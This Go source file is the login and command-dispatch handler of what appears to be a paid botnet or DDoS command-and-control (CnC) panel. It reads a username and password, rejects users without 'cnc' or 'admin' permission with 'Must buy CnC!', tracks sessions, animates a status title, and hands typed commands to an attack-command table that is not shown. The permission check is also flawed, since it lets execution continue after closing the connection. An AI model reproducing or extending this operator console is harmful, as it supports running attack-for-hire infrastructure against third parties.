package net

import (
	"api/core/database"
	"api/core/models"
	"api/core/net/commands"
	"api/core/net/sessions"
	"api/core/net/term"
	"fmt"
	"net"
	"strings"
	"time"
)

var SpinnerChars = []string{"|", "/", "-", "\\"}

func handler(conn net.Conn) {
	defer conn.Close()
	conn.Write([]byte(fmt.Sprintf("\033]0;%s - Login\007", models.Config.Name)))
	//more
	buf := make([]byte, 64)
	if _, err := conn.Read(buf); err != nil {
		logger.Println("Failed to read initial data: ", err)
		return
	}
	tm := term.New(conn)

	fmt.Fprintf(conn, "Username# ")
	username, err := tm.ReadLine("Username# ")
	if err != nil {
		return
	}
	fmt.Fprintf(conn, "Password# ")
	pass, err := tm.ReadPassword("Password# ")
	if err != nil {
		return
	}

	user, err := database.Container.GetUser(username)
	if err != nil {
		fmt.Fprintf(conn, "Database error: %v\r\n", err)
		time.Sleep(5 * time.Second)
		conn.Close()
		return
	}

	if !user.HasPermission("cnc") && !user.HasPermission("admin") {
		fmt.Fprintf(conn, "Must buy CnC!\r\n")
		time.Sleep(5 * time.Second)
		conn.Close()
	}
	
	if !user.IsKey([]byte(pass)) {
		fmt.Fprintf(conn, "Invalid password...\r\n")
		time.Sleep(5 * time.Second)
		conn.Close()
		return
	}

	var Session = &sessions.Session{
		User: user,
		Conn: conn,
	}

	Session.CreateCookie()

	for _, session := range sessions.Sessions {
		if session.User.Username == username {
			fmt.Fprintf(conn, "Session Already Open!")
			logger.Println(session.User.Username + " already has a session open!")
			return
		}
	}

	sessions.SessionMutex.Lock()
	sessions.Sessions[Session.ID] = Session
	sessions.SessionMutex.Unlock()
	var role string
	if Session.User.HasPermission("admin") {
		role = "admin"
	} else {
		role = "user"
	}
	//title
	go func() {
		i := 0 
		
		for {
			time.Sleep(time.Second)
			
			message := fmt.Sprintf("\033]0; [%s] %s CnC - Username [%s] - Online [%d] - Rank [%s] \007",
			SpinnerChars[i%len(SpinnerChars)], models.Config.Name, Session.User.Username, sessions.Count(), role)
			
			if _, err := conn.Write([]byte(message)); err != nil {
				if sessions.RemoveSession(Session.ID) {
					logger.Println(Session.User.Username + " Session Closed!")
				}
				conn.Close()
				break
			}
			
			i++ 
		}
	}()
	commands.Commands["splash-home"].Exec(Session, nil)
	// handler
	for {
		tm.Write([]byte(fmt.Sprintf("%s@%s# ", Session.User.Username, models.Config.Name)))
		cmd, err := tm.ReadLine(fmt.Sprintf("%s@%s# ", Session.User.Username, models.Config.Name))
		if err != nil {
			return
		}
		cmdlist := strings.Split(cmd, " ")
		if !commands.IsCommand(cmdlist[0]) {
			fmt.Fprintf(conn, "Command (%s) is Invalid\r\n", cmdlist[0])
		} else {
			commands.Commands[cmdlist[0]].Exec(Session, cmdlist)
		}
	}
}


